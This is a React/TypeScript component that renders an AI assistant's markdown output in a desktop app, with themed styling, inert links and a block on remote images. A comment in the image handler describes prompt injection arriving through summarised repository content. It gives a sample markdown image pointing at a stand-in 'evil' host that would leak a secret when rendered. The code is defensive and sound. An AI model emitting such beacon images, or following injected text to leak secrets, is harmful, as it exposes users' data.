import { memo } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'

// Renders Claude's assistant text as real markdown — GFM tables, code fences,
// lists, headings, blockquotes — styled for the catppuccin theme. Replaces the
// old raw `whitespace-pre-wrap` dump where tables/pipes showed as symbol soup.
//
// Links are intentionally inert (this is a desktop app, not a browser): we show
// the URL on hover but don't navigate away from the SPA.
const components: Components = {
  // A clearly descending scale so heading levels are distinguishable at a glance:
  // h1–h4 step down in size; h5–h6 switch to small-caps (muted) once sizes get too
  // small to separate reliably.
  h1: ({ node, ...p }) => <h1 className="text-xl font-bold mt-4 mb-2" {...p} />,
  h2: ({ node, ...p }) => <h2 className="text-lg font-semibold mt-3.5 mb-1.5" {...p} />,
  h3: ({ node, ...p }) => <h3 className="text-base font-semibold mt-3 mb-1.5" {...p} />,
  h4: ({ node, ...p }) => <h4 className="text-sm font-semibold mt-2 mb-1" {...p} />,
  h5: ({ node, ...p }) => <h5 className="text-xs font-semibold mt-2 mb-1 uppercase tracking-wide text-ctp-subtext" {...p} />,
  h6: ({ node, ...p }) => <h6 className="text-[11px] font-semibold mt-2 mb-1 uppercase tracking-wide text-ctp-overlay" {...p} />,
  p: ({ node, ...p }) => <p className="my-1.5 leading-relaxed" {...p} />,
  ul: ({ node, ...p }) => <ul className="list-disc pl-5 my-1.5 space-y-0.5" {...p} />,
  ol: ({ node, ...p }) => <ol className="list-decimal pl-5 my-1.5 space-y-0.5" {...p} />,
  li: ({ node, ...p }) => <li className="leading-relaxed" {...p} />,
  strong: ({ node, ...p }) => <strong className="font-semibold text-ctp-text" {...p} />,
  em: ({ node, ...p }) => <em className="italic" {...p} />,
  del: ({ node, ...p }) => <del className="opacity-60" {...p} />,
  a: ({ node, href, ...p }) => (
    <a
      className="text-ctp-blue underline decoration-ctp-blue/40 hover:decoration-ctp-blue cursor-pointer"
      title={href}
      onClick={(e) => e.preventDefault()}
      {...p}
    />
  ),
  // Remote images are NEVER fetched. Markdown here renders model-authored text, and a
  // teammate's report is attacker-influenced by design (it summarises repo content, which
  // can carry a prompt injection). `![](https://evil/beacon?d=<secret>)` would otherwise
  // exfiltrate on render — zero click, just scrolling the card into view — and there is no
  // CSP to fall back on. Relative/same-origin sources are the app's own and still load.
  // The URL stays visible in the tooltip so nothing is hidden from the user.
  img: ({ node, src, alt, ...p }) => {
    const url = typeof src === 'string' ? src : ''
    const remote = /^[a-z][a-z0-9+.-]*:/i.test(url) && !url.startsWith('data:image/')
    if (!remote) return <img className="max-w-full rounded" src={url} alt={alt ?? ''} {...p} />
    return (
      <span
        title={`Blocked remote image: ${url}`}
        className="inline-flex items-center gap-1 rounded border border-ctp-surface2 bg-ctp-surface0/60 px-1.5 py-0.5 text-[11px] text-ctp-overlay align-middle"
      >
        🚫 image not loaded{alt ? `: ${alt}` : ''}
      </span>
    )
  },
  blockquote: ({ node, ...p }) => (
    <blockquote className="border-l-2 border-ctp-surface2 pl-3 my-1.5 text-ctp-subtext italic" {...p} />
  ),
  hr: () => <hr className="my-3 border-ctp-surface1" />,
  pre: ({ node, ...p }) => (
    <pre className="my-2 p-3 rounded-md bg-ctp-crust border border-ctp-surface0 overflow-x-auto text-[12px] font-mono leading-relaxed" {...p} />
  ),
  code: ({ node, className, children, ...p }) => {
    // Block code (fenced) carries a language- class or contains newlines; it's
    // wrapped in <pre> which supplies the frame, so render it bare. Inline code
    // gets a subtle pill.
    const text = String(children ?? '')
    const isBlock = /language-/.test(className ?? '') || text.includes('\n')
    if (isBlock) return <code className={className} {...p}>{children}</code>
    return <code className="px-1 py-0.5 rounded bg-ctp-surface0 text-ctp-peach text-[0.85em] font-mono" {...p}>{children}</code>
  },
  table: ({ node, ...p }) => (
    <div className="my-2 overflow-x-auto rounded-md border border-ctp-surface1">
      <table className="border-collapse text-xs w-full" {...p} />
    </div>
  ),
  thead: ({ node, ...p }) => <thead className="bg-ctp-surface0" {...p} />,
  th: ({ node, ...p }) => <th className="border-b border-ctp-surface1 px-2.5 py-1.5 text-left font-semibold align-top" {...p} />,
  td: ({ node, ...p }) => <td className="border-b border-ctp-surface1/60 px-2.5 py-1.5 align-top" {...p} />,
}

export const Markdown = memo(function Markdown({ text }: { text: string }) {
  return (
    <div className="cm-markdown">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {text}
      </ReactMarkdown>
    </div>
  )
})
